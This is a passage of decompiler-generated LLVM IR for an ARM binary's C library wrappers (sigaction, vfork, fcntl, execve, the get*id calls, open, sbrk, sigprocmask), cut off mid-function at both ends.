  uselistorder i32 (i32)* @__GI_exit, { 0, 10, 9, 8, 7, 6, 5, 3, 2, 1, 4 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_20e18.396, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e7c0, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_e690, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_e678, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_e848 = load i32, i32* @r4, align 4
  %v6_e848 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_e84c = icmp eq i32* %arg2, null
  %v2_e850 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_e84c, label %dec_label_pc_e8bc, label %dec_label_pc_e860

dec_label_pc_e860:                                ; preds = %entry
  %v2_e864 = load i32, i32* %arg2, align 4
  %v4_e864 = add i32 %tmp, 4
  store i32 %v4_e864, i32* @r1, align 4
  %v2_e868 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_e868, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_e864, i32* %stack_var_-156, align 4
  %v0_e874 = call i32 @memcpy()
  store i32 %v0_e874, i32* %r0.global-to-local, align 4
  %v0_e878 = load i32, i32* @r4, align 4
  %v1_e878 = add i32 %v0_e878, 132
  %v2_e878 = inttoptr i32 %v1_e878 to i32*
  %v3_e878 = load i32, i32* %v2_e878, align 4
  %v1_e87c = and i32 %v3_e878, 67108864
  %v2_e87c = icmp eq i32 %v1_e87c, 0
  br i1 %v2_e87c, label %dec_label_pc_e890, label %bb

bb:                                               ; preds = %dec_label_pc_e860
  br label %dec_label_pc_e8ac

dec_label_pc_e890:                                ; preds = %dec_label_pc_e860
  %v1_e898 = and i32 %v3_e878, 4
  %v2_e898 = icmp eq i32 %v1_e898, 0
  br i1 %v2_e898, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_e890
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_e890, %bb20
  br label %dec_label_pc_e8ac

dec_label_pc_e8ac:                                ; preds = %bb, %bb21
  %v2_e8ac = icmp eq i32 %v0_e878, 0
  %v3_e8b0 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_e8b0 = select i1 %v2_e8ac, i32 0, i32 %v3_e8b0
  %v0_e8bc.pre = load i32, i32* @r5, align 4
  %v0_e8cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e8bc

dec_label_pc_e8bc:                                ; preds = %dec_label_pc_e8ac, %entry
  %v0_e8cc = phi i32 [ %arg1, %entry ], [ %v0_e8cc.pre, %dec_label_pc_e8ac ]
  %v0_e8bc = phi i32 [ %arg3, %entry ], [ %v0_e8bc.pre, %dec_label_pc_e8ac ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_e8b0, %dec_label_pc_e8ac ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_e8bc = icmp eq i32 %v0_e8bc, 0
  %.v2_e850 = select i1 %v2_e8bc, i32 0, i32 %v2_e850
  store i32 %.v2_e850, i32* @r2, align 4
  store i32 %v0_e8cc, i32* %r0.global-to-local, align 4
  %v1_e8d0 = call i32 @__syscall_rt_sigaction(i32 %v0_e8cc)
  store i32 %v1_e8d0, i32* %r0.global-to-local, align 4
  %v0_e8d4 = load i32, i32* @r5, align 4
  %v2_e8d4 = icmp eq i32 %v0_e8d4, 0
  br i1 %v2_e8d4, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_e8bc
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_e8bc, %bb25
  %v0_e8e4.pr = phi i32 [ 0, %dec_label_pc_e8bc ], [ 1, %bb25 ]
  %v1_e8dc = icmp slt i32 %v1_e8d0, 0
  br i1 %v1_e8dc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_e918

thread-pre-split:                                 ; preds = %bb26
  %v2_e8e4 = icmp eq i32 %v0_e8e4.pr, 0
  store i32 %v1_e8d0, i32* @r4, align 4
  br i1 %v2_e8e4, label %dec_label_pc_e918, label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %thread-pre-split
  %v2_e8f0 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_e8d4, i32* %r0.global-to-local, align 4
  %v2_e8f8 = inttoptr i32 %v0_e8d4 to i32*
  store i32 %v2_e8f0, i32* %v2_e8f8, align 4
  %v3_e8f8 = load i32, i32* %r0.global-to-local, align 4
  %v4_e8f8 = add i32 %v3_e8f8, 4
  store i32 %v4_e8f8, i32* @r0, align 4
  %v2_e8fc = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_e8fc, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_e904 = call i32 @memcpy()
  store i32 %v0_e904, i32* %r0.global-to-local, align 4
  %v1_e90c = load i32, i32* @r5, align 4
  %v2_e90c = add i32 %v1_e90c, 136
  %v3_e90c = inttoptr i32 %v2_e90c to i32*
  %v1_e914 = load i32, i32* @r5, align 4
  %v2_e914 = add i32 %v1_e914, 132
  %v3_e914 = inttoptr i32 %v2_e914 to i32*
  %v0_e918.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e918

dec_label_pc_e918:                                ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_e8f0
  %v0_e918 = phi i32 [ %v1_e8d0, %thread-pre-split ], [ %v0_e918.pre, %dec_label_pc_e8f0 ], [ %v1_e8d0, %thread-pre-split.thread ]
  store i32 %v0_e918, i32* %r0.global-to-local, align 4
  store i32 %v3_e848, i32* @r4, align 4
  store i32 %v6_e848, i32* @r5, align 4
  ret i32 %v0_e918

; uselistorder directives
  uselistorder i32 %v0_e918, { 1, 0 }
  uselistorder i32 %v0_e8d4, { 1, 0, 2 }
  uselistorder i32 %v0_e8cc, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_e918, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_e8ac, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__vfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e930 = call i32 @vfork()
  store i32 %v0_e930, i32* @r0, align 4
  %v2_e934 = icmp ugt i32 %v0_e930, -4097
  br i1 %v2_e934, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_e948, %entry
  %merge = phi i32 [ %v0_e930, %entry ], [ %v0_e948, %dec_label_pc_e948 ]
  ret i32 %merge

bb1:                                              ; preds = %entry
  %v4_e940 = icmp eq i32 %v0_e930, -38
  br i1 %v4_e940, label %dec_label_pc_e948, label %bb2

dec_label_pc_e948:                                ; preds = %bb1
  %v0_e948 = call i32 @fork()
  store i32 %v0_e948, i32* @r0, align 4
  %v2_e94c = icmp ugt i32 %v0_e948, -4097
  br i1 %v2_e94c, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_e948
  %v0_e954 = call i32 @__syscall_error()
  ret i32 %v0_e954

; uselistorder directives
  uselistorder i32 %v0_e948, { 1, 2, 0 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_e960 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_e960
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_e964 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_e964
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_e968 = load i32, i32* @r2, align 4
  %v1_e978 = add i32 %arg2, -12
  store i32 %v6_e968, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_e978, 2
  br i1 %tmp, label %dec_label_pc_e9a0, label %dec_label_pc_e998

dec_label_pc_e998:                                ; preds = %entry
  %v0_e998 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_e9cc

dec_label_pc_e9a0:                                ; preds = %entry
  %v2_e9a8 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_e9a8, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_e9a8, -4095
  br i1 %tmp8, label %dec_label_pc_e9cc, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9a0
  %v0_e9b8 = call i32 @__errno_location()
  %v0_e9bc = load i32, i32* %r4.global-to-local, align 4
  %v1_e9bc = sub i32 0, %v0_e9bc
  %v2_e9c0 = inttoptr i32 %v0_e9b8 to i32*
  store i32 %v1_e9bc, i32* %v2_e9c0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e9cc

dec_label_pc_e9cc:                                ; preds = %dec_label_pc_e9b8, %dec_label_pc_e9a0, %dec_label_pc_e998
  %storemerge = phi i32 [ %v0_e998, %dec_label_pc_e998 ], [ %v2_e9a8, %dec_label_pc_e9a0 ], [ -1, %dec_label_pc_e9b8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_e9a8, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_e9fc = load i32, i32* @r0, align 4
  store i32 %v0_e9fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e9fc, -4095
  br i1 %tmp, label %dec_label_pc_ea18, label %dec_label_pc_ea08

dec_label_pc_ea08:                                ; preds = %entry
  %v0_ea08 = call i32 @__errno_location()
  %v0_ea0c = load i32, i32* %r4.global-to-local, align 4
  %v1_ea0c = sub i32 0, %v0_ea0c
  %v2_ea10 = inttoptr i32 %v0_ea08 to i32*
  store i32 %v1_ea0c, i32* %v2_ea10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %entry, %dec_label_pc_ea08
  %v0_ea18 = phi i32 [ %v0_e9fc, %entry ], [ -1, %dec_label_pc_ea08 ]
  ret i32 %v0_ea18

; uselistorder directives
  uselistorder i32 %v0_e9fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea18, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ea2c = load i32, i32* @r4, align 4
  store i32 %v3_ea2c, i32* %stack_var_-8, align 4
  %v1_ea30 = load i32, i32* @r1, align 4
  %v2_ea30 = inttoptr i32 %v1_ea30 to %sigaction*
  %v3_ea30 = load i32, i32* @r2, align 4
  %v4_ea30 = inttoptr i32 %v3_ea30 to %sigaction*
  %v5_ea30 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_ea30, %sigaction* %v4_ea30)
  store i32 %v5_ea30, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_ea30, -4095
  br i1 %tmp, label %dec_label_pc_ea50, label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %entry
  %v0_ea40 = call i32 @__errno_location()
  %v0_ea44 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea44 = sub i32 0, %v0_ea44
  %v2_ea48 = inttoptr i32 %v0_ea40 to i32*
  store i32 %v1_ea44, i32* %v2_ea48, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %entry, %dec_label_pc_ea40
  %v0_ea50 = phi i32 [ %v5_ea30, %entry ], [ -1, %dec_label_pc_ea40 ]
  %v2_ea54 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ea54, i32* %r4.global-to-local, align 4
  ret i32 %v0_ea50

; uselistorder directives
  uselistorder i32 %v5_ea30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea50, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ea80 = load i32, i32* @r4, align 4
  store i32 %v3_ea80, i32* %stack_var_-8, align 4
  %v0_ea84 = load i32, i32* @r0, align 4
  %v1_ea84 = inttoptr i32 %v0_ea84 to i8*
  %v2_ea84 = load i32, i32* @r1, align 4
  %v3_ea84 = inttoptr i32 %v2_ea84 to i8*
  %v4_ea84 = insertvalue [1 x i8*] undef, i8* %v3_ea84, 0
  %v5_ea84 = load i32, i32* @r2, align 4
  %v6_ea84 = inttoptr i32 %v5_ea84 to i8*
  %v7_ea84 = insertvalue [1 x i8*] undef, i8* %v6_ea84, 0
  %v8_ea84 = call i32 @execve(i8* %v1_ea84, [1 x i8*] %v4_ea84, [1 x i8*] %v7_ea84)
  store i32 %v8_ea84, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_ea84, -4095
  br i1 %tmp, label %dec_label_pc_eaa4, label %dec_label_pc_ea94

dec_label_pc_ea94:                                ; preds = %entry
  %v0_ea94 = call i32 @__errno_location()
  %v0_ea98 = load i32, i32* %r4.global-to-local, align 4
  %v1_ea98 = sub i32 0, %v0_ea98
  %v2_ea9c = inttoptr i32 %v0_ea94 to i32*
  store i32 %v1_ea98, i32* %v2_ea9c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eaa4

dec_label_pc_eaa4:                                ; preds = %entry, %dec_label_pc_ea94
  %v0_eaa4 = phi i32 [ %v8_ea84, %entry ], [ -1, %dec_label_pc_ea94 ]
  %v2_eaa8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_eaa8, i32* @r4, align 4
  ret i32 %v0_eaa4

; uselistorder directives
  uselistorder i32 %v8_ea84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eaa4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eaac = load i32, i32* @r4, align 4
  store i32 %v3_eaac, i32* %stack_var_-8, align 4
  %v0_eab4 = load i32, i32* @r0, align 4
  store i32 %v0_eab4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eab4, -4095
  br i1 %tmp, label %dec_label_pc_ead0, label %dec_label_pc_eac0

dec_label_pc_eac0:                                ; preds = %entry
  %v0_eac0 = call i32 @__errno_location()
  %v0_eac4 = load i32, i32* %r4.global-to-local, align 4
  %v1_eac4 = sub i32 0, %v0_eac4
  %v2_eac8 = inttoptr i32 %v0_eac0 to i32*
  store i32 %v1_eac4, i32* %v2_eac8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_ead4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ead0

dec_label_pc_ead0:                                ; preds = %entry, %dec_label_pc_eac0
  %v2_ead4 = phi i32 [ %v3_eaac, %entry ], [ %v2_ead4.pre, %dec_label_pc_eac0 ]
  %v0_ead0 = phi i32 [ %v0_eab4, %entry ], [ -1, %dec_label_pc_eac0 ]
  store i32 %v2_ead4, i32* @r4, align 4
  ret i32 %v0_ead0

; uselistorder directives
  uselistorder i32 %v0_eab4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ead0, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ead8 = load i32, i32* @r4, align 4
  store i32 %v3_ead8, i32* %stack_var_-8, align 4
  %v0_eae0 = load i32, i32* @r0, align 4
  store i32 %v0_eae0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eae0, -4095
  br i1 %tmp, label %dec_label_pc_eafc, label %dec_label_pc_eaec

dec_label_pc_eaec:                                ; preds = %entry
  %v0_eaec = call i32 @__errno_location()
  %v0_eaf0 = load i32, i32* %r4.global-to-local, align 4
  %v1_eaf0 = sub i32 0, %v0_eaf0
  %v2_eaf4 = inttoptr i32 %v0_eaec to i32*
  store i32 %v1_eaf0, i32* %v2_eaf4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_eb00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_eafc

dec_label_pc_eafc:                                ; preds = %entry, %dec_label_pc_eaec
  %v2_eb00 = phi i32 [ %v3_ead8, %entry ], [ %v2_eb00.pre, %dec_label_pc_eaec ]
  %v0_eafc = phi i32 [ %v0_eae0, %entry ], [ -1, %dec_label_pc_eaec ]
  store i32 %v2_eb00, i32* @r4, align 4
  ret i32 %v0_eafc

; uselistorder directives
  uselistorder i32 %v0_eae0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eafc, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eb04 = load i32, i32* @r4, align 4
  store i32 %v3_eb04, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_eb28, label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %entry
  %v0_eb18 = call i32 @__errno_location()
  %v0_eb1c = load i32, i32* %r4.global-to-local, align 4
  %v1_eb1c = sub i32 0, %v0_eb1c
  %v2_eb20 = inttoptr i32 %v0_eb18 to i32*
  store i32 %v1_eb1c, i32* %v2_eb20, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_eb2c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_eb28

dec_label_pc_eb28:                                ; preds = %entry, %dec_label_pc_eb18
  %v2_eb2c = phi i32 [ %v3_eb04, %entry ], [ %v2_eb2c.pre, %dec_label_pc_eb18 ]
  %v0_eb28 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_eb18 ]
  store i32 %v2_eb2c, i32* %r4.global-to-local, align 4
  ret i32 %v0_eb28

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb28, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eb30 = load i32, i32* @r4, align 4
  store i32 %v3_eb30, i32* %stack_var_-8, align 4
  %v0_eb38 = load i32, i32* @r0, align 4
  store i32 %v0_eb38, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eb38, -4095
  br i1 %tmp, label %dec_label_pc_eb54, label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %entry
  %v0_eb44 = call i32 @__errno_location()
  %v0_eb48 = load i32, i32* %r4.global-to-local, align 4
  %v1_eb48 = sub i32 0, %v0_eb48
  %v2_eb4c = inttoptr i32 %v0_eb44 to i32*
  store i32 %v1_eb48, i32* %v2_eb4c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_eb58.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_eb54

dec_label_pc_eb54:                                ; preds = %entry, %dec_label_pc_eb44
  %v2_eb58 = phi i32 [ %v3_eb30, %entry ], [ %v2_eb58.pre, %dec_label_pc_eb44 ]
  %v0_eb54 = phi i32 [ %v0_eb38, %entry ], [ -1, %dec_label_pc_eb44 ]
  store i32 %v2_eb58, i32* %r4.global-to-local, align 4
  ret i32 %v0_eb54

; uselistorder directives
  uselistorder i32 %v0_eb38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb54, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_eb5c = load i32, i32* @r4, align 4
  store i32 %v3_eb5c, i32* %stack_var_-8, align 4
  %v6_eb60 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_eb60, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_eb60, -4095
  br i1 %tmp6, label %dec_label_pc_eb80, label %dec_label_pc_eb70

dec_label_pc_eb70:                                ; preds = %entry
  %v0_eb70 = call i32 @__errno_location()
  %v0_eb74 = load i32, i32* %r4.global-to-local, align 4
  %v1_eb74 = sub i32 0, %v0_eb74
  %v2_eb78 = inttoptr i32 %v0_eb70 to i32*
  store i32 %v1_eb74, i32* %v2_eb78, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %entry, %dec_label_pc_eb70
  %v0_eb80 = phi i32 [ %v6_eb60, %entry ], [ -1, %dec_label_pc_eb70 ]
  %v2_eb84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_eb84, i32* %r4.global-to-local, align 4
  ret i32 %v0_eb80

; uselistorder directives
  uselistorder i32 %v6_eb60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eb80, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_eb98 = and i32 %arg2, 64
  %v2_eb98 = icmp eq i32 %v1_eb98, 0
  br i1 %v2_eb98, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_eb88 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_eb88, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_eba8 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_eba8, i32* @r2, align 4
  %v4_ebb0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_ebb4 = icmp eq i32 %v4_ebb0, -4096
  store i1 %v7_ebb4, i1* @cpsr_z, align 1
  store i32 %v4_ebb0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_ebb0, -4095
  br i1 %tmp, label %dec_label_pc_ebd0, label %dec_label_pc_ebc0

dec_label_pc_ebc0:                                ; preds = %.thread1
  %v0_ebc0 = call i32 @__errno_location()
  %v0_ebc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_ebc4 = sub i32 0, %v0_ebc4
  %v2_ebc8 = inttoptr i32 %v0_ebc0 to i32*
  store i32 %v1_ebc4, i32* %v2_ebc8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %.thread1, %dec_label_pc_ebc0
  %v0_ebd0 = phi i32 [ %v4_ebb0, %.thread1 ], [ -1, %dec_label_pc_ebc0 ]
  ret i32 %v0_ebd0

; uselistorder directives
  uselistorder i32 %v4_ebb0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_ebd0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_ebec = load i32, i32* @r0, align 4
  %v2_ebec = inttoptr i32 %v0_ebec to i8*
  %v3_ebec = call i32 @__libc_open(i8* %v2_ebec, i32 577)
  %v0_ebf0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_ebf0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_ebf0 = and i32 %v3_ebec, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_ebf0 = phi i32 [ %v3_ebec, %entry ], [ %v6_ebf0, %bb ]
  ret i32 %v7_ebf0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @__libc_open, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_ebf4 = load i32, i32* @r4, align 4
  store i32 %v3_ebf4, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_20e4c.663 to i32), i32* %r4.global-to-local, align 4
  %v2_ebfc = load i32, i32* @global_var_20e4c.663, align 4
  %v2_ec00 = icmp eq i32 %v2_ebfc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_ec00, label %dec_label_pc_ec10, label %dec_label_pc_ec1c

dec_label_pc_ec10:                                ; preds = %entry
  %v2_ec10 = call i32 @__GI_brk(i32* null)
  %v1_ec14 = icmp slt i32 %v2_ec10, 0
  br i1 %v1_ec14, label %dec_label_pc_ec3c, label %dec_label_pc_ec1cthread-pre-split

dec_label_pc_ec1cthread-pre-split:                ; preds = %dec_label_pc_ec10
  %v0_ec20.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_ec1c.pre = load i32, i32* @global_var_20e4c.663, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_ec1cthread-pre-split, %entry
  %v2_ec1c = phi i32 [ %v2_ec1c.pre, %dec_label_pc_ec1cthread-pre-split ], [ %v2_ebfc, %entry ]
  %v1_ec28 = phi i32 [ %v0_ec20.pr, %dec_label_pc_ec1cthread-pre-split ], [ %arg1, %entry ]
  %v2_ec20 = icmp eq i32 %v1_ec28, 0
  store i32 %v2_ec1c, i32* %r4.global-to-local, align 4
  br i1 %v2_ec20, label %dec_label_pc_ec40, label %dec_label_pc_ec30

dec_label_pc_ec30:                                ; preds = %dec_label_pc_ec1c
  %v2_ec28 = add i32 %v1_ec28, %v2_ec1c
  %v1_ec30 = inttoptr i32 %v2_ec28 to i32*
  %v2_ec30 = call i32 @__GI_brk(i32* %v1_ec30)
  %v1_ec34 = icmp slt i32 %v2_ec30, 0
  br i1 %v1_ec34, label %dec_label_pc_ec3c, label %dec_label_pc_ec30.dec_label_pc_ec40_crit_edge

dec_label_pc_ec30.dec_label_pc_ec40_crit_edge:    ; preds = %dec_label_pc_ec30
  %v0_ec40.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec40

dec_label_pc_ec3c:                                ; preds = %dec_label_pc_ec30, %dec_label_pc_ec10
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec40

dec_label_pc_ec40:                                ; preds = %dec_label_pc_ec30.dec_label_pc_ec40_crit_edge, %dec_label_pc_ec1c, %dec_label_pc_ec3c
  %v0_ec40 = phi i32 [ %v0_ec40.pre, %dec_label_pc_ec30.dec_label_pc_ec40_crit_edge ], [ %v2_ec1c, %dec_label_pc_ec1c ], [ -1, %dec_label_pc_ec3c ]
  %v2_ec44 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_ec44, i32* @r4, align 4
  ret i32 %v0_ec40

; uselistorder directives
  uselistorder i32 %v2_ec1c, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_ec40, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ec4c = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_ec4c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_ec545 = load i32, i32* @r4, align 4
  store i32 %v3_ec545, i32* %stack_var_-8, align 4
  br label %dec_label_pc_ec74

bb:                                               ; preds = %entry
  %v3_ec54 = load i32, i32* @r4, align 4
  store i32 %v3_ec54, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_ec74, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %bb
  %v0_ec60 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ec6c = inttoptr i32 %v0_ec60 to i32*
  store i32 22, i32* %v2_ec6c, align 4
  %v0_ec98.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec74:                                ; preds = %.thread, %bb
